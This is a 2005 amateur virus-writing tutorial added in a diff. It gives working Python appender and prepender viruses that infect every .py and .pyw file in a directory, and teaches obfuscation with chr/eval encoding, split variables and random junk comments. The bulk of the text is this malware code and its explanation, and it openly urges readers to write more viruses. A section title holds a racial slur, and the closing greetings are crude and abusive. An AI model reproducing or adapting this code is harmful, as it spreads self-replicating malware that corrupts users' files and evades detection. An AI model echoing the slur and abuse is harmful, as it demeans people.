@@ -1,0 +1,231 @@
+Python Virus Writing Tutorial 
+By VortX 2005 
+
+
+-Python? 
+-Python Appender 
+-Python Prepender Virus 
+-Virus As ASCII Numbers 
+-Using Variables To Encrypt 
+-Adding Trash 
+-snizzle p00p niggar 
+
+
+I warn you: This is the first tutorial i have ever written, so i guess it will be a bit shit!  
+
+Python? 
+
+Python is a freeware powerful interpreted programming language available for most operating systems. 
+It is object-oriented, interactive, portable and easy to learn. It is also popular as a CGI scripting 
+language, as its capabilities compare favorably with those of Perl (Not that i code perl) 
+It can be interpreted in a number of operating systems, this makes very good idea for future viruses  
+So erm, lets go!  
+
+
+Python Appender Virus: 
+
+Here i will show you a small appender. Appenders are a type of standard file infection along 
+with prepender and the lame overwriters (that no one really likes!) Damnit :p 
+Appending means to write the virus code after the normal code, therefore, the virus is run 
+after the hostcode. 
+
+<><><><><><><><><><><><><><Start Code><><><><><><><><><><><><><><! 
+
+Code: 
+Code: 
+import glob #! 
+from string import * #! 
+Files = glob.glob("*.py") + glob.glob("*.pyw") #! 
+for Files in Files: #! 
+   vCode = open(__file__, 'r') #! 
+   victim = open (Files, 'r') #! 
+   readvictim = victim.read() #! 
+   if find(readvictim, "-=::Vort3x::=-") == -1: #! 
+       victim = open(Files, 'a') #! 
+       for code in vCode.readlines(): #! 
+            if ("#!") in code: #! 
+                vCode.close() #! 
+                mycode=(chr(10)+code) #! 
+                victim.write(mycode) #! 
+
+
+
+<><><><><><><><><><><><><><><End Code><><><><><><><><><><><><><><! 
+
+Here is how it works: 
+
+1: Searched for files (py / pyw) in current directory 
+2: Looks inside those files to find the infection marker. Note: this virus has 2 markers, ill explain later  
+3: Finds its own code 
+4: Opens the uninfected files and writes its code to the end of the normal code. 
+5: Closes all open files.. finished! 
+
+Why it has 2 markers: Well, the ones you notice the most are the virus code markers, we use these to 
+know what code to infect other files with. The virus will only copy the code that has "#!" at the end of 
+each line, understand? there are other ways of doing this but blah it works  
+Then we have the infection marker "-=::Vort3x::=-" this is so we can see if the file has already been infected. 
+If we dont use any infection marker, bad things will happen!!  Such as your virus re-appending to files. :O 
+Then you end up with HUGE files, growing in size each time its executed! 
+
+
+Python Prepender Virus 
+
+Prependers are again standard infection types. All this does is add its code to the top of the 
+infected file  
+
+<><><><><><><><><><><><><><Start Code><><><><><><><><><><><><><><! 
+
+Code: 
+Code: 
+import glob 
+from string import * 
+x = glob.glob("*.py") + glob.glob("*.pyw") 
+for x in x: 
+    host = open(x, 'r') 
+    hostcode = host.read() 
+    if find(hostcode, "-=::VortX::=-") == -1: 
+        host = open(x, 'w') 
+        myself = open(__file__, 'r') 
+        a = myself.read() 
+        num=50*2+5 
+        a = a[:find(a, "#VORTX")+num] 
+        mybody=a+chr(10)+hostcode 
+        myself.close() 
+        host.write(mybody) 
+#VORTX 
+
+
+<><><><><><><><><><><><><><End Code><><><><><><><><><><><><><><! 
+
+So: 
+-We seach for files 
+-Open the files and read its contents 
+-Store the code in a variable 
+-Open Myself (yahahaha Confused ) 
+-Read my body and store in a variable 
+-Open the file(s) that havnt been infected (for writing) they are the files that dont have "-=::VortX::=-" inside!  
+-Cound number of characters long the virus code it upto the virus marker "#VORTX" 
+-Store everything into a new variable, write the virus code to the file and append the normal code to the end of the virus code. 
+
+Hmm hope that makes sense? its really easy.. think about it, play with the code  
+
+Virus As ASCII Numbers: 
+
+This method is easy and common in scripting languages. We change the code to its ASCII numbers. 
+Erm apart from spending hours encrypting it.. its easy  Thats why its a good idea to make your own 
+encryption tool  Made mine in VB, it saved time!!!! Very Happy but i think there is something like 
+that on VX Heaven, if you cant make your own? but you will need to play with the code a bit to make 
+it work in python. 
+
+<><><><><><><><><><><><><><Start Code><><><><><><><><><><><><><><! 
+Code: 
+
+Code: 
+eval(chr(114)+chr(97)+chr(119)+chr(95)+chr(105)+chr(110)+chr(112)+chr(117)+chr(116)+chr(40)+chr(34)+chr(73)+chr(109)+chr(32)+chr(86)+chr(111)+chr(114)+chr(116)+chr(88)+chr(44)+chr(32)+chr(87)+chr(101)+chr(108)+chr(99)+chr(111)+chr(109)+chr(101)+chr(32)+chr(116)+chr(111)+chr(32)+chr(109)+chr(121)+chr(32)+chr(119)+chr(111)+chr(114)+chr(108)+chr(100)+chr(33)+chr(34)+chr(41)) 
+
+
+<><><><><><><><><><><><><><End Code><><><><><><><><><><><><><><! 
+
+This code has the "Raw_input" command (used for asking user input) but "print" neva seems to 
+work :/ Anywayz, its impossible to read this or know what it is unless you decrypt it all. 
+the code uses a command called "eval" eval is a function which evaluates a string as though it 
+were an expression and returns a result, we use it to run commands... this is used alot in encryption! 
+
+
+
+Using Variables To Encrypt: 
+
+Setting your own variable for each character (set of characters) 
+
+<><><><><><><><><><><><><><Start Code><><><><><><><><><><><><><><! 
+
+Code: 
+Code: 
+aa="pu" 
+bb="aw" 
+cc="t(" 
+dd="r" 
+ee="_in" 
+ff="he" 
+hq="erz" 
+js=chr(34) 
+gg="ll" 
+yu="VX" 
+hh="o"+chr(32) 
+eval(dd+bb+ee+aa+cc+js+ff+gg+hh+yu+hq+js+')') 
+
+
+
+<><><><><><><><><><><><><><End Code><><><><><><><><><><><><><><! 
+
+Nothing much to say about that, its another encryption. 
+
+
+Adding Trash: 
+
+It adds random trash code in each line at a random lengh. Hmm i hate to say it but 
+this code is pretty lame! it does not add its code in random area's  
+But i think it gives a good idea of poly in python!  
+
+<><><><><><><><><><><><><><Start Code><><><><><><><><><><><><><><! 
+
+Code: 
+Code: 
+import glob #! 
+import random #! 
+from string import * #! 
+trash = 'abcdefghijklmnopqrstuvwxyz' #! 
+lengh = random.randrange(10, 20) #! 
+Files = glob.glob("*.py") + glob.glob("*.pyw") #! 
+for Files in Files: #! 
+  vCode = open(__file__, 'r') #! 
+  victim = open (Files, 'r') #! 
+  readvictim = victim.read() #! 
+  if find(readvictim, "-=::Vort3x::=-") == -1: #! 
+      victim = open(Files, 'a') #! 
+      for code in vCode.readlines(): #! 
+           if ("#!") in code: #! 
+               vCode.close() #! 
+               mycode=(chr(10)+code) #! 
+               victim.write("#"+join(random.sample(trash, lengh))+mycode) #! 
+
+<><><><><><><><><><><><><><End Code><><><><><><><><><><><><><><! 
+
+Yokay, ill explain  
+
+First we import the "Random module" 
+Then we set some random characters / numbers, into the "Trash" variable 
+Then we set the lengh of the random trash (the lengh is also random for 10 - 20) 
+Then we write our virus code to the host. 
+Then we put a comment marker for the trash (bcoz trash is not supposed to be executed!) we space each line in the infected file and add random characters 
+a random lengh from the trash variable into that line, please understand! its not hard  
+
+Its very very easy i think! It helps if you learn a little python first befor you start bitching about not understanding the code  because im not 
+about to answer emails asking me what each and every line does! im busy with trying to get into a college :/ 
+
+snizzle p00p niggar: 
+
+Hmmm i have been typing this out for almost 2 hours, so, i dont really want to say much more  
+But, i think Python is a cool language, there is a lot to be done yet. I'd like to see more python viruses lazy arse bastards! I should have done more, but only today i started learning python again after almost 3 months! :p 
+Please tell me about any bugs in my code (yea yea!)  
+
+Big huge YOUR THE BEST to SPTH my idol!  thx for all the help!!!!!!.. and yes.. im annoying!  
+HoneyHeart........... for being a good friend  
+LL............. She;s cool  lolz, i still want ur number  
+Sinclair........... for allowing me in DCA chan, not that i often go there :/ 
+Blueowl............ For helping me for some time. 
+hurm1t............ he;s got everything.. worship him  thnx for your sources.. nice! 
+Nova.......... Lush graphics for my desktop  thank me for all the girls you bastard > 
+Blueprint............. for hosting my little scripts  
+Blank.................. for hosting this tutorial *havnt asked yet* but he WILL *Gets the knife* he will!!!! 
+dr3f.................... Fucking cock sucker!!!!! 
+AngelArt............. for being a friend  awwww  we are all waitng for your script! Female programmers exist! 
+Muazzin.............. where the fuck are you? wanted to talk to me, next day ur GONE! :/ 
+Thugstyle................ haha Very Happy 
+Shree............... did you ENJOY sending porn from MY account!!! wrong time of the month?  
+
+And others.. that im afraid to list :X like bliss but he sux so who cares :p 
+
+
+Contact: 
+STFU
